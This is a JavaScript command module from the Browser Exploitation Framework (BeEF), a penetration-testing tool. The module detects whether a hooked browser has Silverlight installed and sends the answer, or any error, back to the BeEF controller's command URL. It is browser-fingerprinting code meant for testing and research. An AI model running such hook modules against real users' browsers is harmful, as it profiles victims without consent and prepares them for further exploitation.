
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(
    new beef.Command(null, function() {
        var result = null;
        var answer_key;
        var answer_val;
        try {
            answer_val = (beef.browser.hasSilverlight())? "Yes" : "No";
            result = new beef.CmdResult("<%= @command_id %>", beef.CmdResultEnum.SUCCESS, { "silverlight" : answer_val});
            beef.net.send("<%= @command_url %>", "<%= @command_id %>", JSON.stringify(result));
            beef.are.update(result);
        } catch(ex){
            answer_val = ex.toString();
            result = new beef.CmdResult("<%= @command_id %>", beef.CmdResultEnum.ERROR, { "error" : answer_val});
            beef.net.send("<%= @command_url %>", "<%= @command_id %>", JSON.stringify(result));
            beef.are.update(result);
        }
    })
);

